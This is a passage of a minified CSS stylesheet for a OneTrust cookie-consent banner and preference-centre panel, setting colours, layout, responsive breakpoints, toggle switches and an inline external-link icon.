#onetrust-policy-title,#onetrust-banner-sdk #onetrust-policy-text{color:dimgray;float:left}#onetrust-banner-sdk #onetrust-button-group-parent{min-height:1px;text-align:center}#onetrust-banner-sdk #onetrust-button-group{display:inline-block}#onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{background-color:#68b631;color:#fff;border-color:#68b631;margin-right:1em;min-width:125px;height:auto;white-space:normal;word-break:break-word;word-wrap:break-word;padding:12px 10px;line-height:1.2;font-size:.813em;font-weight:600}#onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link{background-color:#fff;border:none;color:#68b631;text-decoration:underline;padding-left:0;padding-right:0}#onetrust-banner-sdk .onetrust-close-btn-ui{width:44px;height:44px;background-size:12px;border:none;position:relative;margin:auto;padding:0}#onetrust-banner-sdk .banner_logo{display:none}#onetrust-banner-sdk .ot-b-addl-desc{clear:both;float:left;display:block}#onetrust-banner-sdk #banner-options{float:left;display:table;margin-right:0;margin-left:1em;width:calc(100% - 1em)}#onetrust-banner-sdk .banner-option-input{cursor:pointer;width:auto;height:auto;border:none;padding:0;padding-right:3px;margin:0 0 10px;font-size:.82em;line-height:1.4}#onetrust-banner-sdk .banner-option-input *{pointer-events:none;font-size:inherit;line-height:inherit}#onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details{display:block;height:auto}#onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container{transform:rotate(90deg)}#onetrust-banner-sdk .banner-option{margin-bottom:12px;margin-left:0;border:none;float:left;padding:0}#onetrust-banner-sdk .banner-option:first-child{padding-left:2px}#onetrust-banner-sdk .banner-option:not(:first-child){padding:0;border:none}#onetrust-banner-sdk .banner-option-header{cursor:pointer;display:inline-block}#onetrust-banner-sdk .banner-option-header :first-child{color:dimgray;font-weight:bold;float:left}#onetrust-banner-sdk .banner-option-header .ot-arrow-container{display:inline-block;border-top:6px solid transparent;border-bottom:6px solid transparent;border-left:6px solid dimgray;margin-left:10px;vertical-align:middle}#onetrust-banner-sdk .banner-option-details{display:none;font-size:.83em;line-height:1.5;padding:10px 0px 5px 10px;margin-right:10px;height:0px}#onetrust-banner-sdk .banner-option-details *{font-size:inherit;line-height:inherit;color:dimgray}#onetrust-banner-sdk .ot-arrow-container,#onetrust-banner-sdk .banner-option-details{transition:all 300ms ease-in 0s;-webkit-transition:all 300ms ease-in 0s;-moz-transition:all 300ms ease-in 0s;-o-transition:all 300ms ease-in 0s}#onetrust-banner-sdk .ot-dpd-container{float:left}#onetrust-banner-sdk .ot-dpd-title{margin-bottom:10px}#onetrust-banner-sdk .ot-dpd-title,#onetrust-banner-sdk .ot-dpd-desc{font-size:.88em;line-height:1.4;color:dimgray}#onetrust-banner-sdk .ot-dpd-title *,#onetrust-banner-sdk .ot-dpd-desc *{font-size:inherit;line-height:inherit}#onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text *{margin-bottom:0}#onetrust-banner-sdk.ot-iab-2 .onetrust-vendors-list-handler{display:block;margin-left:0;margin-top:5px;clear:both;margin-bottom:0;padding:0;border:0;height:auto;width:auto}#onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button{display:block}#onetrust-banner-sdk.ot-close-btn-link{padding-top:25px}#onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container{top:15px;transform:none;right:15px}#onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button{padding:0;white-space:pre-wrap;border:none;height:auto;line-height:1.5;text-decoration:underline;font-size:.69em}#onetrust-banner-sdk #onetrust-policy-text,#onetrust-banner-sdk .ot-dpd-desc,#onetrust-banner-sdk .ot-b-addl-desc{font-size:.813em;line-height:1.5}#onetrust-banner-sdk .ot-dpd-desc{margin-bottom:10px}#onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc{margin-top:10px;margin-bottom:10px;font-size:1em}@media only screen and (max-width: 425px){#onetrust-banner-sdk #onetrust-close-btn-container{position:absolute;top:6px;right:2px}#onetrust-banner-sdk #onetrust-policy{margin-left:0;margin-top:3em}#onetrust-banner-sdk #onetrust-button-group{display:block}#onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{width:100%}#onetrust-banner-sdk .onetrust-close-btn-ui{top:auto;transform:none}#onetrust-banner-sdk #onetrust-policy-title{display:inline;float:none}#onetrust-banner-sdk #banner-options{margin:0;padding:0;width:100%}}@media only screen and (min-width: 426px)and (max-width: 896px){#onetrust-banner-sdk #onetrust-close-btn-container{position:absolute;top:0;right:0}#onetrust-banner-sdk #onetrust-policy{margin-left:1em;margin-right:1em}#onetrust-banner-sdk .onetrust-close-btn-ui{top:10px;right:10px}#onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container{width:95%}#onetrust-banner-sdk.ot-iab-2 #onetrust-group-container{width:100%}#onetrust-banner-sdk #onetrust-button-group-parent{width:100%;position:relative;margin-left:0}#onetrust-banner-sdk #onetrust-button-group button{display:inline-block}#onetrust-banner-sdk #onetrust-button-group{margin-right:0;text-align:center}#onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler{float:left}#onetrust-banner-sdk .has-reject-all-button #onetrust-reject-all-handler,#onetrust-banner-sdk .has-reject-all-button #onetrust-accept-btn-handler{float:right}#onetrust-banner-sdk .has-reject-all-button #onetrust-button-group{width:calc(100% - 2em);margin-right:0}#onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link{padding-left:0px;text-align:left}#onetrust-banner-sdk.ot-buttons-fw .ot-sdk-three button{width:100%;text-align:center}#onetrust-banner-sdk.ot-buttons-fw #onetrust-button-group-parent button{float:none}#onetrust-banner-sdk.ot-buttons-fw #onetrust-pc-btn-handler.cookie-setting-link{text-align:center}}@media only screen and (min-width: 550px){#onetrust-banner-sdk .banner-option:not(:first-child){border-left:1px solid #d8d8d8;padding-left:25px}}@media only screen and (min-width: 425px)and (max-width: 550px){#onetrust-banner-sdk.ot-iab-2 #onetrust-button-group,#onetrust-banner-sdk.ot-iab-2 #onetrust-policy,#onetrust-banner-sdk.ot-iab-2 .banner-option{width:100%}}@media only screen and (min-width: 769px){#onetrust-banner-sdk #onetrust-button-group{margin-right:30%}#onetrust-banner-sdk #banner-options{margin-left:2em;margin-right:5em;margin-bottom:1.25em;width:calc(100% - 7em)}}@media only screen and (min-width: 897px)and (max-width: 1023px){#onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent{position:absolute;top:50%;left:75%;transform:translateY(-50%)}#onetrust-banner-sdk #onetrust-close-btn-container{top:50%;margin:auto;transform:translate(-50%, -50%);position:absolute;padding:0;right:0}#onetrust-banner-sdk #onetrust-close-btn-container button{position:relative;margin:0;right:-22px;top:2px}}@media only screen and (min-width: 1024px){#onetrust-banner-sdk #onetrust-close-btn-container{top:50%;margin:auto;transform:translate(-50%, -50%);position:absolute;right:0}#onetrust-banner-sdk #onetrust-close-btn-container button{right:-12px}#onetrust-banner-sdk #onetrust-policy{margin-left:2em}#onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent{position:absolute;top:50%;left:60%;transform:translateY(-50%)}#onetrust-banner-sdk.ot-iab-2 #onetrust-policy-title{width:50%}#onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text,#onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc{margin-bottom:1em;width:50%;border-right:1px solid #d8d8d8;padding-right:1rem}#onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text{margin-bottom:0;padding-bottom:1em}#onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc{margin-bottom:0;padding-bottom:1em}#onetrust-banner-sdk.ot-iab-2 .ot-dpd-container{width:45%;padding-left:1rem;display:inline-block;float:none}#onetrust-banner-sdk.ot-iab-2 .ot-dpd-title{line-height:1.7}#onetrust-banner-sdk.ot-iab-2 #onetrust-button-group-parent{left:auto;right:4%;margin-left:0}#onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button{display:block}#onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent{margin:auto;width:30%}#onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container{width:60%}#onetrust-banner-sdk #onetrust-button-group{margin-right:auto}#onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{margin-top:1em}}@media only screen and (min-width: 890px){#onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group-parent{padding-left:3%;padding-right:4%;margin-left:0}#onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group{margin-right:0;margin-top:1.25em;width:100%}#onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button{width:100%;margin-bottom:5px;margin-top:5px}#onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button:last-of-type{margin-bottom:20px}}@media only screen and (min-width: 1280px){#onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container{width:55%}#onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent{width:44%;padding-left:2%;padding-right:2%}#onetrust-banner-sdk:not(.ot-iab-2).vertical-align-content #onetrust-button-group-parent{position:absolute;left:55%}}
        #onetrust-consent-sdk #onetrust-banner-sdk {background-color: #FFFFFF;}
            #onetrust-consent-sdk #onetrust-policy-title,
                    #onetrust-consent-sdk #onetrust-policy-text,
                    #onetrust-consent-sdk .ot-b-addl-desc,
                    #onetrust-consent-sdk .ot-dpd-desc,
                    #onetrust-consent-sdk .ot-dpd-title,
                    #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
                    #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
                    #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
                    #onetrust-banner-sdk .ot-cat-header {
                        color: #696969;
                    }
            #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
                    background-color: #E9E9E9;}
             #onetrust-consent-sdk #onetrust-banner-sdk a[href],
                    #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
                    #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn
                        {
                            color: #3860BE;
                        }#onetrust-consent-sdk #onetrust-accept-btn-handler,
                         #onetrust-banner-sdk #onetrust-reject-all-handler {
                            background-color: #1371C3;border-color: #1371C3;
                color: #FFFFFF;
            }
            #onetrust-consent-sdk #onetrust-banner-sdk *:focus,
            #onetrust-consent-sdk #onetrust-banner-sdk:focus {
               outline-color: #000000;
               outline-width: 1px;
            }
            #onetrust-consent-sdk #onetrust-pc-btn-handler,
            #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
                color: #1371C3; border-color: #1371C3;
                background-color: 
                #FFFFFF;
            }#onetrust-pc-sdk.otPcCenter{overflow:hidden;position:fixed;margin:0 auto;top:5%;right:0;left:0;width:40%;max-width:575px;min-width:575px;border-radius:2.5px;z-index:2147483647;background-color:#fff;-webkit-box-shadow:0px 2px 10px -3px #999;-moz-box-shadow:0px 2px 10px -3px #999;box-shadow:0px 2px 10px -3px #999}#onetrust-pc-sdk.otPcCenter[dir=rtl]{right:0;left:0}#onetrust-pc-sdk.otRelFont{font-size:1rem}#onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr,#onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus,#onetrust-pc-sdk .ot-hide-tgl{visibility:hidden}#onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr *,#onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus *,#onetrust-pc-sdk .ot-hide-tgl *{visibility:hidden}#onetrust-pc-sdk #ot-gn-venlst .ot-ven-item .ot-acc-hdr{min-height:40px}#onetrust-pc-sdk .ot-pc-header{height:39px;padding:10px 0 10px 30px;border-bottom:1px solid #e9e9e9}#onetrust-pc-sdk #ot-pc-title,#onetrust-pc-sdk #ot-category-title,#onetrust-pc-sdk .ot-cat-header,#onetrust-pc-sdk #ot-lst-title,#onetrust-pc-sdk .ot-ven-hdr .ot-ven-name,#onetrust-pc-sdk .ot-always-active{font-weight:bold;color:dimgray}#onetrust-pc-sdk .ot-cat-header{float:left;font-weight:600;font-size:.875em;line-height:1.5;max-width:90%;vertical-align:middle}#onetrust-pc-sdk .ot-always-active-group .ot-cat-header{width:55%;font-weight:700}#onetrust-pc-sdk .ot-cat-item p{clear:both;float:left;margin-top:10px;margin-bottom:5px;line-height:1.5;font-size:.812em;color:dimgray}#onetrust-pc-sdk .ot-close-icon{height:44px;width:44px;background-size:10px}#onetrust-pc-sdk #ot-pc-title{float:left;font-size:1em;line-height:1.5;margin-bottom:10px;margin-top:10px;width:100%}#onetrust-pc-sdk #accept-recommended-btn-handler{margin-right:10px;margin-bottom:25px;outline-offset:-1px}#onetrust-pc-sdk #ot-pc-desc{clear:both;width:100%;font-size:.812em;line-height:1.5;margin-bottom:25px}#onetrust-pc-sdk #ot-pc-desc a{margin-left:5px}#onetrust-pc-sdk #ot-pc-desc *{font-size:inherit;line-height:inherit}#onetrust-pc-sdk #ot-pc-desc ul li{padding:10px 0px}#onetrust-pc-sdk a{color:#656565;cursor:pointer}#onetrust-pc-sdk a:hover{color:#3860be}#onetrust-pc-sdk label{margin-bottom:0}#onetrust-pc-sdk #vdr-lst-dsc{font-size:.812em;line-height:1.5;padding:10px 15px 5px 15px}#onetrust-pc-sdk button{max-width:394px;padding:12px 30px;line-height:1;word-break:break-word;word-wrap:break-word;white-space:normal;font-weight:bold;height:auto}#onetrust-pc-sdk .ot-link-btn{padding:0;margin-bottom:0;border:0;font-weight:normal;line-height:normal;width:auto;height:auto}#onetrust-pc-sdk #ot-pc-content{position:absolute;overflow-y:scroll;padding-left:0px;padding-right:30px;top:60px;bottom:110px;margin:1px 3px 0 30px;width:calc(100% - 63px)}#onetrust-pc-sdk .ot-cat-grp .ot-always-active{float:right;clear:none;color:#3860be;margin:0;font-size:.813em;line-height:1.3}#onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-track{margin-right:20px}#onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar{width:11px}#onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-thumb{border-radius:10px;background:#d8d8d8}#onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr{outline:#000 1px solid}#onetrust-pc-sdk .ot-pc-scrollbar{scrollbar-arrow-color:#d8d8d8;scrollbar-darkshadow-color:#d8d8d8;scrollbar-face-color:#d8d8d8;scrollbar-shadow-color:#d8d8d8}#onetrust-pc-sdk .save-preference-btn-handler{margin-right:20px}#onetrust-pc-sdk .ot-pc-refuse-all-handler{margin-right:10px}#onetrust-pc-sdk #ot-pc-desc .privacy-notice-link{margin-left:0}#onetrust-pc-sdk .ot-subgrp-cntr{display:inline-block;clear:both;width:100%;padding-top:15px}#onetrust-pc-sdk .ot-switch+.ot-subgrp-cntr{padding-top:10px}#onetrust-pc-sdk ul.ot-subgrps{margin:0;font-size:initial}#onetrust-pc-sdk ul.ot-subgrps li p,#onetrust-pc-sdk ul.ot-subgrps li h5{font-size:.813em;line-height:1.4;color:dimgray}#onetrust-pc-sdk ul.ot-subgrps .ot-switch{min-height:auto}#onetrust-pc-sdk ul.ot-subgrps .ot-switch-nob{top:0}#onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr{display:inline-block;width:100%}#onetrust-pc-sdk ul.ot-subgrps .ot-acc-txt{margin:0}#onetrust-pc-sdk ul.ot-subgrps li{padding:0;border:none}#onetrust-pc-sdk ul.ot-subgrps li h5{position:relative;top:5px;font-weight:bold;margin-bottom:0;float:left}#onetrust-pc-sdk li.ot-subgrp{margin-left:20px;overflow:auto}#onetrust-pc-sdk li.ot-subgrp>h5{width:calc(100% - 100px)}#onetrust-pc-sdk .ot-cat-item p>ul,#onetrust-pc-sdk li.ot-subgrp p>ul{margin:0px;list-style:disc;margin-left:15px;font-size:inherit}#onetrust-pc-sdk .ot-cat-item p>ul li,#onetrust-pc-sdk li.ot-subgrp p>ul li{font-size:inherit;padding-top:10px;padding-left:0px;padding-right:0px;border:none}#onetrust-pc-sdk .ot-cat-item p>ul li:last-child,#onetrust-pc-sdk li.ot-subgrp p>ul li:last-child{padding-bottom:10px}#onetrust-pc-sdk .ot-pc-logo{height:40px;width:120px;display:inline-block}#onetrust-pc-sdk .ot-pc-footer{position:absolute;bottom:0px;width:100%;max-height:160px;border-top:1px solid #d8d8d8}#onetrust-pc-sdk.ot-ftr-stacked .ot-pc-refuse-all-handler{margin-bottom:0px}#onetrust-pc-sdk.ot-ftr-stacked #ot-pc-content{bottom:160px}#onetrust-pc-sdk.ot-ftr-stacked .ot-pc-footer button{width:100%;max-width:none}#onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container{margin:0 30px;width:calc(100% - 60px);padding-right:0}#onetrust-pc-sdk .ot-pc-footer-logo{height:30px;width:100%;text-align:right;background:#f4f4f4}#onetrust-pc-sdk .ot-pc-footer-logo a{display:inline-block;margin-top:5px;margin-right:10px}#onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo{direction:rtl}#onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo a{margin-right:25px}#onetrust-pc-sdk .ot-tgl{float:right;position:relative;z-index:1}#onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob{background-color:#cddcf2;border:1px solid #3860be}#onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before{-webkit-transform:translateX(20px);-ms-transform:translateX(20px);transform:translateX(20px);background-color:#3860be;border-color:#3860be}#onetrust-pc-sdk .ot-tgl input:focus+.ot-switch{outline:#000 solid 1px}#onetrust-pc-sdk .ot-switch{position:relative;display:inline-block;width:45px;height:25px}#onetrust-pc-sdk .ot-switch-nob{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#f2f1f1;border:1px solid #ddd;transition:all .2s ease-in 0s;-moz-transition:all .2s ease-in 0s;-o-transition:all .2s ease-in 0s;-webkit-transition:all .2s ease-in 0s;border-radius:20px}#onetrust-pc-sdk .ot-switch-nob:before{position:absolute;content:"";height:21px;width:21px;bottom:1px;background-color:#7d7d7d;-webkit-transition:.4s;transition:.4s;border-radius:20px}#onetrust-pc-sdk .ot-chkbox input:checked~label::before{background-color:#3860be}#onetrust-pc-sdk .ot-chkbox input+label::after{content:none;color:#fff}#onetrust-pc-sdk .ot-chkbox input:checked+label::after{content:""}#onetrust-pc-sdk .ot-chkbox input:focus+label::before{outline-style:solid;outline-width:2px;outline-style:auto}#onetrust-pc-sdk .ot-chkbox label{position:relative;display:inline-block;padding-left:30px;cursor:pointer;font-weight:500}#onetrust-pc-sdk .ot-chkbox label::before,#onetrust-pc-sdk .ot-chkbox label::after{position:absolute;content:"";display:inline-block;border-radius:3px}#onetrust-pc-sdk .ot-chkbox label::before{height:18px;width:18px;border:1px solid #3860be;left:0px;top:auto}#onetrust-pc-sdk .ot-chkbox label::after{height:5px;width:9px;border-left:3px solid;border-bottom:3px solid;transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);-webkit-transform:rotate(-45deg);left:4px;top:5px}#onetrust-pc-sdk .ot-label-txt{display:none}#onetrust-pc-sdk .ot-chkbox input,#onetrust-pc-sdk .ot-tgl input{position:absolute;opacity:0;width:0;height:0}#onetrust-pc-sdk .ot-arw-cntr{float:right;position:relative;pointer-events:none}#onetrust-pc-sdk .ot-arw-cntr .ot-arw{width:16px;height:16px;margin-left:5px;color:dimgray;display:inline-block;vertical-align:middle;-webkit-transition:all 150ms ease-in 0s;-moz-transition:all 150ms ease-in 0s;-o-transition:all 150ms ease-in 0s;transition:all 150ms ease-in 0s}#onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw,#onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw-cntr svg{transform:rotate(90deg);-o-transform:rotate(90deg);-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg)}#onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr{outline:#000 1px solid}#onetrust-pc-sdk .ot-tgl-cntr,#onetrust-pc-sdk .ot-arw-cntr{display:inline-block}#onetrust-pc-sdk .ot-tgl-cntr{width:45px;float:right;margin-top:2px}#onetrust-pc-sdk #ot-lst-cnt .ot-tgl-cntr{margin-top:10px}#onetrust-pc-sdk .ot-always-active-subgroup{width:auto;padding-left:0px !important;top:3px;position:relative}#onetrust-pc-sdk .ot-label-status{padding-left:5px;font-size:.75em;display:none}#onetrust-pc-sdk .ot-arw-cntr{margin-top:-1px}#onetrust-pc-sdk .ot-arw-cntr svg{-webkit-transition:all 300ms ease-in 0s;-moz-transition:all 300ms ease-in 0s;-o-transition:all 300ms ease-in 0s;transition:all 300ms ease-in 0s;height:10px;width:10px}#onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw{transform:rotate(90deg);-o-transform:rotate(90deg);-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg)}#onetrust-pc-sdk .ot-arw{width:10px;margin-left:15px;transition:all 300ms ease-in 0s;-webkit-transition:all 300ms ease-in 0s;-moz-transition:all 300ms ease-in 0s;-o-transition:all 300ms ease-in 0s}#onetrust-pc-sdk .ot-vlst-cntr{margin-bottom:0}#onetrust-pc-sdk .ot-hlst-cntr{margin-top:5px;display:inline-block;width:100%}#onetrust-pc-sdk .category-vendors-list-handler,#onetrust-pc-sdk .category-vendors-list-handler+a,#onetrust-pc-sdk .category-host-list-handler{clear:both;color:#3860be;margin-left:0;font-size:.813em;text-decoration:none;float:left;overflow:hidden}#onetrust-pc-sdk .category-vendors-list-handler:hover,#onetrust-pc-sdk .category-vendors-list-handler+a:hover,#onetrust-pc-sdk .category-host-list-handler:hover{color:#1883fd}#onetrust-pc-sdk .category-vendors-list-handler+a{clear:none}#onetrust-pc-sdk .category-vendors-list-handler+a::after{content:"";height:15px;width:15px;background-repeat:no-repeat;margin-left:5px;float:right;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 511.626 511.627'%3E%3Cg fill='%231276CE'%3E%3Cpath d='M392.857 292.354h-18.274c-2.669 0-4.859.855-6.563 2.573-1.718 1.708-2.573 3.897-2.573 6.563v91.361c0 12.563-4.47 23.315-13.415 32.262-8.945 8.945-19.701 13.414-32.264 13.414H82.224c-12.562 0-23.317-4.469-32.264-13.414-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562 4.471-23.313 13.417-32.259 8.947-8.947 19.702-13.418 32.264-13.418h200.994c2.669 0 4.859-.859 6.57-2.57 1.711-1.713 2.566-3.9 2.566-6.567V82.221c0-2.662-.855-4.853-2.566-6.563-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648 0-42.016 8.042-58.102 24.125C8.042 113.297 0 132.665 0 155.313v237.542c0 22.647 8.042 42.018 24.123 58.095 16.086 16.084 35.454 24.13 58.102 24.13h237.543c22.647 0 42.017-8.046 58.101-24.13 16.085-16.077 24.127-35.447 24.127-58.095v-91.358c0-2.669-.856-4.859-2.574-6.57-1.713-1.718-3.903-2.573-6.565-2.573z'/%3E%3Cpath d='M506.199 41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948 0-9.233 1.807-12.847 5.424-3.617 3.615-5.428 7.898-5.428 12.847s1.811 9.233 5.428 12.85l50.247 50.248-186.147 186.151c-1.906 1.903-2.856 4.093-2.856 6.563 0 2.479.953 4.668 2.856 6.571l32.548 32.544c1.903 1.903 4.093 2.852 6.567 2.852s4.665-.948 6.567-2.852l186.148-186.148 50.251 50.248c3.614 3.617 7.898 5.426 12.847 5.426s9.233-1.809 12.851-5.426c3.617-3.616 5.424-7.898 5.424-12.847V54.818c-.001-4.952-1.814-9.232-5.428-12.847z'/%3E%3C/g%3E%3C/svg%3E")}#onetrust-pc-sdk .back-btn-handler{font-size:1em;text-decoration:none}#onetrust-pc-sdk .back-btn-handler:hover{opacity:.6}#onetrust-pc-sdk #ot-lst-title h3{display:inline-block;word-break:break-word;word-wrap:break-word;margin-bottom:0;color:#656565;font-size:1em;font-weight:bold;margin-left:15px}#onetrust-pc-sdk #ot-lst-title{margin:10px 0 10px 0px;font-size:1em;text-align:left}#onetrust-pc-sdk #ot-pc-hdr{margin:0 0 0 30px;height:auto;width:auto}#onetrust-pc-sdk #ot-pc-hdr input::placeholder{color:#d4d4d4;font-style:italic}#onetrust-pc-sdk #vendor-search-handler{height:31px;width:100%;border-radius:50px;font-size:.8em;padding-right:35px;padding-left:15px;float:left;margin-left:15px}#onetrust-pc-sdk .ot-ven-name{display:block;width:auto;padding-right:5px}#onetrust-pc-sdk #ot-lst-cnt{overflow-y:auto;margin-left:20px;margin-right:7px;width:calc(100% - 27px);max-height:calc(100% - 80px);height:100%;transform:translate3d(0, 0, 0)}#onetrust-pc-sdk #ot-pc-lst{width:100%;bottom:100px;position:absolute;top:60px}#onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr,#onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr *{visibility:hidden}#onetrust-pc-sdk #ot-pc-lst .ot-tgl-cntr{right:12px;position:absolute}#onetrust-pc-sdk #ot-pc-lst .ot-arw-cntr{float:right;position:relative}#onetrust-pc-sdk #ot-pc-lst .ot-arw{margin-left:10px}#onetrust-pc-sdk #ot-pc-lst .ot-acc-hdr{overflow:hidden;cursor:pointer}#onetrust-pc-sdk .ot-vlst-cntr{overflow:hidden}#onetrust-pc-sdk #ot-sel-blk{overflow:hidden;width:100%;position:sticky;position:-webkit-sticky;top:0;z-index:3}#onetrust-pc-sdk #ot-back-arw{height:12px;width:12px}#onetrust-pc-sdk .ot-lst-subhdr{width:100%;display:inline-block}#onetrust-pc-sdk .ot-search-cntr{float:left;width:78%;position:relative}#onetrust-pc-sdk .ot-search-cntr>svg{width:30px;height:30px;position:absolute;float:left;right:-15px}#onetrust-pc-sdk .ot-fltr-cntr{float:right;right:50px;position:relative}#onetrust-pc-sdk #filter-btn-handler{background-color:#3860be;border-radius:17px;display:inline-block;position:relative;width:32px;height:32px;-moz-transition:.1s ease;-o-transition:.1s ease;-webkit-transition:1s ease;transition:.1s ease;padding:0;margin:0}#onetrust-pc-sdk #filter-btn-handler:hover{background-color:#3860be}#onetrust-pc-sdk #filter-btn-handler svg{width:12px;height:12px;margin:3px 10px 0 10px;display:block;position:static;right:auto;top:auto}#onetrust-pc-sdk .ot-ven-link{color:#3860be;text-decoration:none;font-weight:100;display:inline-block;padding-top:10px;transform:translate(0, 1%);-o-transform:translate(0, 1%);-ms-transform:translate(0, 1%);-webkit-transform:translate(0, 1%);position:relative;z-index:2}#onetrust-pc-sdk .ot-ven-link *{font-size:inherit}#onetrust-pc-sdk .ot-ven-link:hover{text-decoration:underline}#onetrust-pc-sdk .ot-ven-hdr{width:calc(100% - 160px);height:auto;float:left;word-break:break-word;word-wrap:break-word;vertical-align:middle;padding-bottom:3px}#onetrust-pc-sdk .ot-ven-link{letter-spacing:.03em;font-size:.75em;font-weight:400}#onetrust-pc-sdk .ot-ven-dets{border-radius:2px;background-color:#f8f8f8}#onetrust-pc-sdk .ot-ven-dets li:first-child p:first-child{border-top:none}#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:not(:first-child){border-top:1px solid #e9e9e9}#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p{display:inline-block}#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(odd){width:30%}#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(even){width:50%;word-break:break-word;word-wrap:break-word}#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p,#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h4{padding-top:5px;padding-bottom:5px;display:block}#onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h4{display:inline-block}#onetrust-pc-sdk .ot-ven-dets p,#onetrust-pc-sdk .ot-ven-dets h4,#onetrust-pc-sdk .ot-ven-dets span{font-size:.69em;text-align:left;vertical-align:middle;word-break:break-word;word-wrap:break-word;margin:0;padding-bottom:10px;padding-left:15px;color:#2e3644}#onetrust-pc-sdk .ot-ven-dets h4{padding-top:5px}#onetrust-pc-sdk .ot-ven-dets span{color:dimgray;padding:0;vertical-align:baseline}#onetrust-pc-sdk .ot-ven-dets .ot-ven-pur h4{border-top:1px solid #e9e9e9;border-bottom:1px solid #e9e9e9;padding-bottom:5px;margin-bottom:5px;font-weight:bold}#onetrust-pc-sdk #ot-host-lst .ot-sel-all{float:right;position:relative;margin-right:42px;top:10px}#onetrust-pc-sdk #ot-host-lst .ot-sel-all input[type=checkbox]{width:auto;height:auto}#onetrust-pc-sdk #ot-host-lst .ot-sel-all label{height:20px;width:20px;padding-left:0px}#onetrust-pc-sdk #ot-host-lst .ot-acc-txt{overflow:hidden;width:95%}#onetrust-pc-sdk .ot-host-hdr{position:relative;z-index:1;pointer-events:none;width:calc(100% - 125px);float:left}#onetrust-pc-sdk .ot-host-name,#onetrust-pc-sdk .ot-host-desc{display:inline-block;width:90%}#onetrust-pc-sdk .ot-host-name{pointer-events:none}#onetrust-pc-sdk .ot-host-hdr>a{text-decoration:underline;font-size:.82em;position:relative;z-index:2;float:left;margin-bottom:5px;pointer-events:initial}#onetrust-pc-sdk 